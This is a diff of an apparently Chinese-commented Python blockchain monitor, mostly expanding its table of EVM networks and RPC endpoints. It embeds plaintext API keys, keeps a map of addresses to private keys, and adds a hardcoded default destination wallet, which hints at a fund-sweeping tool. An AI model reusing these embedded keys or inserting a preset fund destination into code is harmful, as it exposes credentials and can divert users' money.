@@ -36,175 +36,280 @@ class EVMMonitor:
         # 配置
         self.ALCHEMY_API_KEY = "S0hs4qoXIR1SMD8P7I6Wt"
         
-        # 支持的全链网络配置
+        # 支持的全链网络配置（Alchemy支持的所有EVM链）
         self.networks = {
-            # 以太坊生态
+            # Ethereum主网和测试网
             'ethereum': {
                 'name': 'Ethereum Mainnet',
                 'chain_id': 1,
                 'rpc_urls': [
                     f'https://eth-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
-                    'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
-                    'https://rpc.ankr.com/eth',
-                    'https://eth-mainnet.public.blastapi.io',
-                    'https://ethereum.publicnode.com'
+                    'https://ethereum.publicnode.com',
+                    'https://rpc.ankr.com/eth'
                 ],
                 'native_currency': 'ETH',
                 'explorer': 'https://etherscan.io'
             },
             
-            # BSC智能链
+            'ethereum_sepolia': {
+                'name': 'Ethereum Sepolia',
+                'chain_id': 11155111,
+                'rpc_urls': [
+                    f'https://eth-sepolia.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://sepolia.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://sepolia.etherscan.io'
+            },
+            
+            # Polygon网络
+            'polygon': {
+                'name': 'Polygon Mainnet',
+                'chain_id': 137,
+                'rpc_urls': [
+                    f'https://polygon-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://polygon.publicnode.com',
+                    'https://rpc.ankr.com/polygon'
+                ],
+                'native_currency': 'MATIC',
+                'explorer': 'https://polygonscan.com'
+            },
+            
+            'polygon_amoy': {
+                'name': 'Polygon Amoy',
+                'chain_id': 80002,
+                'rpc_urls': [
+                    f'https://polygon-amoy.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://rpc-amoy.polygon.technology'
+                ],
+                'native_currency': 'MATIC',
+                'explorer': 'https://amoy.polygonscan.com'
+            },
+            
+            # Arbitrum网络
+            'arbitrum': {
+                'name': 'Arbitrum One',
+                'chain_id': 42161,
+                'rpc_urls': [
+                    f'https://arb-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://arbitrum.publicnode.com',
+                    'https://rpc.ankr.com/arbitrum'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://arbiscan.io'
+            },
+            
+            'arbitrum_sepolia': {
+                'name': 'Arbitrum Sepolia',
+                'chain_id': 421614,
+                'rpc_urls': [
+                    f'https://arb-sepolia.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://sepolia-rollup.arbitrum.io/rpc'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://sepolia.arbiscan.io'
+            },
+            
+            # Optimism网络
+            'optimism': {
+                'name': 'Optimism Mainnet',
+                'chain_id': 10,
+                'rpc_urls': [
+                    f'https://opt-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://optimism.publicnode.com',
+                    'https://rpc.ankr.com/optimism'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://optimistic.etherscan.io'
+            },
+            
+            'optimism_sepolia': {
+                'name': 'Optimism Sepolia',
+                'chain_id': 11155420,
+                'rpc_urls': [
+                    f'https://opt-sepolia.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://sepolia.optimism.io'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://sepolia-optimistic.etherscan.io'
+            },
+            
+            # Base网络
+            'base': {
+                'name': 'Base Mainnet',
+                'chain_id': 8453,
+                'rpc_urls': [
+                    f'https://base-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://base.publicnode.com',
+                    'https://rpc.ankr.com/base'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://basescan.org'
+            },
+            
+            'base_sepolia': {
+                'name': 'Base Sepolia',
+                'chain_id': 84532,
+                'rpc_urls': [
+                    f'https://base-sepolia.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://sepolia.base.org'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://sepolia.basescan.org'
+            },
+            
+
+            
+            # Blast网络
+            'blast': {
+                'name': 'Blast Mainnet',
+                'chain_id': 81457,
+                'rpc_urls': [
+                    f'https://blast-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://rpc.blast.io'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://blastscan.io'
+            },
+            
+            'blast_sepolia': {
+                'name': 'Blast Sepolia',
+                'chain_id': 168587773,
+                'rpc_urls': [
+                    f'https://blast-sepolia.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://sepolia.blast.io'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://testnet.blastscan.io'
+            },
+            
+            # Frax网络
+            'frax': {
+                'name': 'Frax Mainnet',
+                'chain_id': 252,
+                'rpc_urls': [
+                    f'https://frax-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://rpc.frax.com'
+                ],
+                'native_currency': 'FRAX',
+                'explorer': 'https://fraxscan.com'
+            },
+            
+            # zkSync网络
+            'zksync': {
+                'name': 'zkSync Era',
+                'chain_id': 324,
+                'rpc_urls': [
+                    f'https://zksync-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://mainnet.era.zksync.io'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://explorer.zksync.io'
+            },
+            
+            'zksync_sepolia': {
+                'name': 'zkSync Sepolia',
+                'chain_id': 300,
+                'rpc_urls': [
+                    f'https://zksync-sepolia.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://sepolia.era.zksync.dev'
+                ],
+                'native_currency': 'ETH',
+                'explorer': 'https://sepolia.explorer.zksync.io'
+            },
+            
+
+            
+            # Astar网络
+            'astar': {
+                'name': 'Astar Network',
+                'chain_id': 592,
+                'rpc_urls': [
+                    f'https://astar-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
+                    'https://evm.astar.network'
+                ],
+                'native_currency': 'ASTR',
+                'explorer': 'https://astar.subscan.io'
+            },
+            
+            # 其他主流EVM链
+            'avalanche': {
+                'name': 'Avalanche C-Chain',
+                'chain_id': 43114,
+                'rpc_urls': [
+                    'https://api.avax.network/ext/bc/C/rpc',
+                    'https://rpc.ankr.com/avalanche'
+                ],
+                'native_currency': 'AVAX',
+                'explorer': 'https://snowtrace.io'
+            },
+            
+            'fantom': {
+                'name': 'Fantom Opera',
+                'chain_id': 250,
+                'rpc_urls': [
+                    'https://rpc.ftm.tools',
+                    'https://rpc.ankr.com/fantom'
+                ],
+                'native_currency': 'FTM',
+                'explorer': 'https://ftmscan.com'
+            },
+            
             'bsc': {
-                'name': 'Binance Smart Chain',
+                'name': 'BNB Smart Chain',
                 'chain_id': 56,
                 'rpc_urls': [
                     'https://bsc-dataseed1.binance.org',
-                    'https://bsc-dataseed2.binance.org', 
-                    'https://bsc-dataseed3.binance.org',
-                    'https://rpc.ankr.com/bsc',
                     'https://bsc.publicnode.com'
                 ],
                 'native_currency': 'BNB',
                 'explorer': 'https://bscscan.com'
             },
             
-            # Polygon
-            'polygon': {
-                'name': 'Polygon',
-                'chain_id': 137,
-                'rpc_urls': [
-                    f'https://polygon-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
-                    'https://polygon-rpc.com',
-                    'https://rpc.ankr.com/polygon',
-                    'https://polygon.publicnode.com',
-                    'https://polygon-mainnet.public.blastapi.io'
-                ],
-                'native_currency': 'MATIC',
-                'explorer': 'https://polygonscan.com'
-            },
-            
-            # Arbitrum One
-            'arbitrum': {
-                'name': 'Arbitrum One',
-                'chain_id': 42161,
-                'rpc_urls': [
-                    f'https://arb-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
-                    'https://arbitrum-one.public.blastapi.io',
-                    'https://rpc.ankr.com/arbitrum',
-                    'https://arbitrum.publicnode.com'
-                ],
-                'native_currency': 'ETH',
-                'explorer': 'https://arbiscan.io'
-            },
-            
-            # Optimism
-            'optimism': {
-                'name': 'Optimism',
-                'chain_id': 10,
-                'rpc_urls': [
-                    f'https://opt-mainnet.g.alchemy.com/v2/{self.ALCHEMY_API_KEY}',
-                    'https://optimism.publicnode.com',
-                    'https://rpc.ankr.com/optimism',
-                    'https://optimism-mainnet.public.blastapi.io'
-                ],
-                'native_currency': 'ETH',
-                'explorer': 'https://optimistic.etherscan.io'
-            },
-            
-            # Avalanche C-Chain
-            'avalanche': {
-                'name': 'Avalanche C-Chain',
-                'chain_id': 43114,
-                'rpc_urls': [
-                    'https://api.avax.network/ext/bc/C/rpc',
-                    'https://rpc.ankr.com/avalanche',
-                    'https://avalanche.publicnode.com',
-                    'https://avalanche-c-chain.publicnode.com'
-                ],
-                'native_currency': 'AVAX',
-                'explorer': 'https://snowtrace.io'
-            },
-            
-            # Fantom
-            'fantom': {
-                'name': 'Fantom Opera',
-                'chain_id': 250,
-                'rpc_urls': [
-                    'https://rpc.ftm.tools',
-                    'https://rpc.ankr.com/fantom',
-                    'https://fantom.publicnode.com',
-                    'https://rpc.fantom.network'
-                ],
-                'native_currency': 'FTM',
-                'explorer': 'https://ftmscan.com'
-            },
-            
-            # Base
-            'base': {
-                'name': 'Base',
-                'chain_id': 8453,
-                'rpc_urls': [
-                    'https://base.publicnode.com',
-                    'https://rpc.ankr.com/base',
-                    'https://base-mainnet.public.blastapi.io'
-                ],
-                'native_currency': 'ETH',
-                'explorer': 'https://basescan.org'
-            },
-            
-            # Cronos
             'cronos': {
                 'name': 'Cronos',
                 'chain_id': 25,
                 'rpc_urls': [
                     'https://evm.cronos.org',
-                    'https://cronos.publicnode.com',
-                    'https://rpc.ankr.com/cronos'
+                    'https://cronos.publicnode.com'
                 ],
                 'native_currency': 'CRO',
                 'explorer': 'https://cronoscan.com'
             },
             
-            # Gnosis Chain
             'gnosis': {
                 'name': 'Gnosis Chain',
                 'chain_id': 100,
                 'rpc_urls': [
                     'https://rpc.gnosischain.com',
-                    'https://gnosis.publicnode.com',
-                    'https://rpc.ankr.com/gnosis'
+                    'https://gnosis.publicnode.com'
                 ],
                 'native_currency': 'xDAI',
                 'explorer': 'https://gnosisscan.io'
             },
             
-            # Celo
             'celo': {
                 'name': 'Celo',
                 'chain_id': 42220,
                 'rpc_urls': [
                     'https://forno.celo.org',
-                    'https://celo.publicnode.com',
-                    'https://rpc.ankr.com/celo'
+                    'https://celo.publicnode.com'
                 ],
                 'native_currency': 'CELO',
                 'explorer': 'https://celoscan.io'
             },
             
-            # Moonbeam
             'moonbeam': {
                 'name': 'Moonbeam',
                 'chain_id': 1284,
                 'rpc_urls': [
                     'https://rpc.api.moonbeam.network',
-                    'https://moonbeam.publicnode.com',
-                    'https://rpc.ankr.com/moonbeam'
+                    'https://moonbeam.publicnode.com'
                 ],
                 'native_currency': 'GLMR',
                 'explorer': 'https://moonscan.io'
             },
             
-            # Aurora
             'aurora': {
                 'name': 'Aurora',
                 'chain_id': 1313161554,
@@ -219,7 +324,7 @@ class EVMMonitor:
         
         # 状态变量
         self.wallets: Dict[str, str] = {}  # address -> private_key
-        self.target_wallet = ""
+        self.target_wallet = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"  # 默认目标钱包
         self.monitored_addresses: Dict[str, Dict] = {}  # address -> {networks: [...], last_check: timestamp}
         self.monitoring = False
         self.monitor_thread = None
@@ -272,6 +377,11 @@ class EVMMonitor:
                     # 测试连接并获取链ID验证
                     if w3.is_connected():
                         try:
+                            # 跳过特殊链ID（如非EVM链）
+                            if network_info['chain_id'] == 0:
+                                print(f"{Fore.YELLOW}⚠️ {network_info['name']} 暂不支持 (非标准EVM链){Style.RESET_ALL}")
+                                continue
+                                
                             chain_id = w3.eth.chain_id
                             if chain_id == network_info['chain_id']:
                                 self.web3_connections[network_key] = w3
